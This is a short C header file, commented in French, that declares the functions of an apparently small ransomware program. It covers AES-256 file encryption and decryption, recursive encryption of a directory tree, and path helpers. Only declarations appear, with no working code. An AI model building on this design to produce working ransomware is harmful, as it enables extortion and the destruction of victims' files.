#ifndef RANSOMWARE_H
#define RANSOMWARE_H

#include <openssl/evp.h>
#include <openssl/aes.h>
  
#define BUFFER_SIZE 4096 
#define KEY_SIZE 32 // Taille de la clé AES (256 bits)
#define IV_SIZE 16  // Taille du vecteur d'initialisation (IV)
#define AES_BLOCK_SIZE 16 // Tampon de 16 octets pour s'assurer qu'il y a suffisamment d'espace pour les données traitées par AES

// Fonction pour chiffrer un fichier
int encrypt_file(const char *input_path, unsigned char *key, unsigned char *iv);

// // Fonction pour déchiffrer un fichier
int decrypt_file(const char *input_path, unsigned char *key, unsigned char *iv);

// Fonction pour lire et encrypter/decrypter un répertoire et ses sous-répertoires
void read_and_crypt_directory(const char *dir_path, int mode, unsigned char *key, unsigned char *iv);

// Fonction auxiliaire pour vérifier si un fichier est régulier
int is_regular_file(const char *path);

int is_directory(const char *path);

// Fonction pour construire le chemin d'accès complet
void construct_path(const char *directory, const char *file, char *full_path, size_t size);

#endif // RANSOMWARE_H
